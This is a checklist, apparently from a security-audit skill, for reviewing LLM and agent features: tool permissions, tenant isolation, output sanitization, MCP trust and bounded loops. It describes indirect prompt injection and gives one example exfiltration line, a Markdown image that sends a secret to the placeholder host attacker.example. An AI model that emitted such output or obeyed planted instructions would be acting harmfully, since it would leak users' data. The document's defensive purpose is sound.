# LLM and agent features

Adapted from cloudflare/security-audit-skill `AI-AND-LLM.md` (MIT, https://github.com/cloudflare/security-audit-skill), with the output-handling notes from getsentry/skills `security-review` (Apache-2.0, https://github.com/getsentry/skills).

Prompt injection by itself isn't a finding. A finding needs a code-level boundary failure: untrusted content reaches another user's or company's model context, a tool acts with authority the requester doesn't have, the model's output reaches a sink, or data the requester can't read ends up in the answer. A system prompt telling the model to behave is not a control. Count only deterministic checks in code.

## Map first

For the feature under review, list with `file:line`:

- Context writers: who can write each piece of text that enters the prompt (the user, other companies' product descriptions and messages, uploaded files, emails, tickets, web pages, tool results, stored memory).
- Execution identity: whose credentials each tool call uses (the requesting user's, a service account, an API key with company-wide scope).
- Tools with side effects: sending email or messages, creating or changing orders, refunds, record updates, outbound HTTP, file writes, code execution.
- Output destinations: where the answer goes (rendered with `v-html` or Markdown, written to the database, sent to another user, fed to another tool).

## Checks

- Tool handlers re-check the requesting user's permission and company on the exact resource named in the arguments. An agent running on a service account without that check is a confused deputy.
- Tool arguments are input: validate them in the handler like any request (SQL, file paths, URLs for SSRF, IDs scoped to the company). A JSON schema checks shape, not authority.
- Side-effecting actions are bound to what the user approved: the confirmation covers the normalized tool name and full argument object, and a later turn, retry or resumed session can't change them.
- Retrieval, embeddings, conversation history, caches and agent memory are filtered by company in the query and in every cache key, not only by a field on the stored record.
- Content written by one party and read in another party's session (indirect injection) can't trigger tools in that session without the session owner's confirmation.
- Model output rendered as HTML or Markdown is sanitized like any user content. Markdown images and links in output can send data out (`![](https://attacker.example/?q=<secret>)`), so strip or proxy external images, or block them with CSP.
- The prompt doesn't include secrets, other companies' data or credentials that the answer could reveal.
- Loops are bounded: a maximum number of tool calls and tokens per request, per-user quotas, cancellation, and idempotency on retried side effects.
- MCP: tool descriptions and metadata from a server are untrusted text. Servers are pinned, tokens are scoped to what the tool needs, and results from one server can't satisfy another server's pending call.
- Data sent to the model provider: prompts and logs containing PII. Whether the provider retains or trains on them is a contract fact, so "Needs validation" unless the repo shows the setting.

## Proving it

Build a local test with a fixture document that contains a planted instruction and a mocked model client that returns the tool call the instruction asks for. Assert that the handler rejects it or asks for confirmation. Don't call a paid model API with real data to prove a finding.
